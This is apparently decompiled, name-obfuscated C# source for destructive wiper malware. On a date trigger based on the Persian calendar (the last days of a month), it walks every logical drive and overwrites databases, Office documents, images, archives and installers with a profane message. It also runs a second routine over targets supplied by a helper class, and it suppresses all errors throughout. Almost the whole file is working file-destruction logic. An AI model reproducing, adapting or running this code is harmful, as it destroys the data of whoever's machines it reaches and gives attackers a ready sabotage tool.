using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using ns0;
using ns1;
using ns2;
using ns5;

namespace ns3;

internal static class Class8
{
	public static readonly int int_0 = 14400000;

	private static readonly string string_0 = "*.dbf;*.fpt;*.cdx;*.mdb;*.accdb;*.mdf;*.txt;*.xls?;*.doc?;*.ppt?;*.jpg;*.bak;*.rar;*.7z;*.zip;*.cab;*.msi;*setup.exe";

	private static readonly string string_1 = "Because fuck you! That's why.";

	private static readonly int int_1 = 70;

	[CompilerGenerated]
	private static Action<List<string>> action_0;

	public static void smethod_0()
	{
		do
		{
			if (smethod_1())
			{
				smethod_2();
			}
			Thread.Sleep(int_0);
		}
		while (Class34.bool_0);
	}

	private static bool smethod_1()
	{
		DateTime now = DateTime.Now;
		PersianCalendar persianCalendar = new PersianCalendar();
		int month = persianCalendar.GetMonth(now);
		int year = persianCalendar.GetYear(now);
		int dayOfMonth = persianCalendar.GetDayOfMonth(now);
		int daysInMonth = persianCalendar.GetDaysInMonth(year, month);
		if (month != 1 && month != 12 && month / 2 == 0)
		{
			return false;
		}
		if (daysInMonth - dayOfMonth <= 3)
		{
			return true;
		}
		return false;
	}

	private static void smethod_2()
	{
		IAsyncResult asyncResult = new Delegate5(smethod_3).BeginInvoke(null, null);
		IAsyncResult asyncResult2 = new Delegate5(smethod_4).BeginInvoke(null, null);
		asyncResult.AsyncWaitHandle.WaitOne();
		asyncResult2.AsyncWaitHandle.WaitOne();
	}

	private static void smethod_3()
	{
		try
		{
			List<string> list = Class17.smethod_3();
			List<string> list2 = new List<string>();
			foreach (string item in list)
			{
				try
				{
					if (Class17.smethod_2(item))
					{
						list2.Add(item);
					}
				}
				catch
				{
				}
			}
			foreach (string item2 in list2)
			{
				List<string> list3 = Class17.smethod_1(item2);
				foreach (string item3 in list3)
				{
					try
					{
						Class17.smethod_0(item2, item3);
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private static void smethod_4()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			for (int num = logicalDrives.Length - 1; num >= 0; num--)
			{
				string startPath = logicalDrives[num];
				Class39.smethod_0(startPath, string_0, subdirectories: true, delegate(List<string> list_0)
				{
					foreach (string item in list_0)
					{
						if (int_1 > 0)
						{
							Thread.Sleep(int_1);
						}
						try
						{
							File.WriteAllText(item, string_1);
						}
						catch
						{
						}
					}
				}, Class18.list_0);
			}
		}
		catch
		{
		}
	}

	[CompilerGenerated]
	private static void smethod_5(List<string> list_0)
	{
		foreach (string item in list_0)
		{
			if (int_1 > 0)
			{
				Thread.Sleep(int_1);
			}
			try
			{
				File.WriteAllText(item, string_1);
			}
			catch
			{
			}
		}
	}
}
